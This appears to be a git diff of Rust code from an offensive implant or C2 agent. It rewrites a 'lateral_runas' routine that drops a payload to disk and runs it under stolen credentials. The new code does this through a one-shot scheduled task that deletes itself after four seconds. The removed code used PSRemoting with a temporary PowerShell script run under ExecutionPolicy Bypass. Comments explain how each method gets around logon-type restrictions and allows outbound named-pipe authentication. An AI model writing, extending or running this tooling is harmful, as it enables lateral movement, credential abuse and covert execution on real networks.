@@ -316,8 +316,7 @@ mod inner {
     pub fn lateral_runas(data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
         let svc_name = rand_svc_name();
 
-        // Write payload bytes to disk when provided, unless the destination
-        // is the same file the agent is currently running from (os error 32).
+        // Write payload bytes to disk when provided.
         let drop_path: String;
         let effective_path: &str = if !data.is_empty() {
             let fname = std::path::Path::new(cmd_path)
@@ -334,55 +333,54 @@ mod inner {
             cmd_path
         };
 
-        // PSRemoting (WinRM, logon type 3) bypasses both the interactive-logon
-        // GPO restriction and NTLM loopback limits. Start-Process inside the
-        // remote scriptblock creates the process without blocking: PowerShell
-        // is launched with .spawn() so the agent thread returns immediately.
-        runas_psremoting_spawn(effective_path, user, pass)
-    }
+        // Strip leading ".\" from user for schtasks /RU (schtasks rejects "." as domain).
+        let ru_account = if let Some(idx) = user.find('\\') {
+            let domain = &user[..idx];
+            let uname  = &user[idx + 1..];
+            if domain == "." { uname.to_string() } else { user.to_string() }
+        } else {
+            user.to_string()
+        };
 
-    fn runas_psremoting_spawn(exe_path: &str, user: &str, pass: &str) -> Result<String, String> {
-        use std::time::{SystemTime, UNIX_EPOCH};
-        let t = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .subsec_nanos();
-        let tmp = format!("C:\\Users\\Public\\run_{:08x}.ps1", t);
+        let task_name = svc_name.clone();
 
-        let safe_pass = pass.replace('\'', "''");
-        let safe_user = user.replace('\'', "''");
-        let safe_exe  = exe_path.replace('\'', "''");
-
-        let script = format!(
-            "$pw = ConvertTo-SecureString '{}' -AsPlainText -Force\r\n\
-             $cred = New-Object PSCredential('{}', $pw)\r\n\
-             Invoke-Command -ComputerName '127.0.0.1' -Credential $cred \
-             -ScriptBlock {{ Start-Process '{}' }}\r\n",
-            safe_pass, safe_user, safe_exe
-        );
-
-        fs::write(&tmp, script.as_bytes())
-            .map_err(|e| format!("runas_psremoting: write ps1 failed: {}", e))?;
-
-        // .spawn() — PowerShell runs in background, agent is NOT blocked.
-        // The ps1 is read by PowerShell within ~1s of launch, so a short
-        // sleep before cleanup is sufficient.
-        let _child = Command::new("powershell.exe")
+        // schtasks /RU+/RP creates a batch-logon session (type 4) — unlike PSRemoting
+        // (type 3), the child process can authenticate outbound to named pipes.
+        let create_out = Command::new("schtasks")
             .args([
-                "-NonInteractive",
-                "-NoProfile",
-                "-ExecutionPolicy", "Bypass",
-                "-File", &tmp,
+                "/create",
+                "/RU", &ru_account, "/RP", pass,
+                "/TR", effective_path,
+                "/TN", &task_name,
+                "/SC", "ONCE", "/ST", "00:00",
+                "/F",
             ])
-            .spawn()
-            .map_err(|e| format!("runas_psremoting: spawn failed: {}", e))?;
+            .output()
+            .map_err(|e| format!("runas: schtasks /create: {}", e))?;
 
-        std::thread::sleep(std::time::Duration::from_secs(2));
-        let _ = fs::remove_file(&tmp);
+        if !create_out.status.success() {
+            return Err(format!(
+                "runas: schtasks /create failed: {}{}",
+                String::from_utf8_lossy(&create_out.stdout),
+                String::from_utf8_lossy(&create_out.stderr),
+            ));
+        }
+
+        let _ = Command::new("schtasks")
+            .args(["/run", "/TN", &task_name])
+            .output();
+
+        let tn = task_name.clone();
+        std::thread::spawn(move || {
+            std::thread::sleep(std::time::Duration::from_secs(4));
+            let _ = Command::new("schtasks")
+                .args(["/delete", "/TN", &tn, "/F"])
+                .output();
+        });
 
         Ok(format!(
-            "[+] runas → {} (PSRemoting)\n    path: {}\n",
-            user, exe_path
+            "[+] runas → {} (schtasks)\n    path: {}\n",
+            user, effective_path
         ))
     }
 
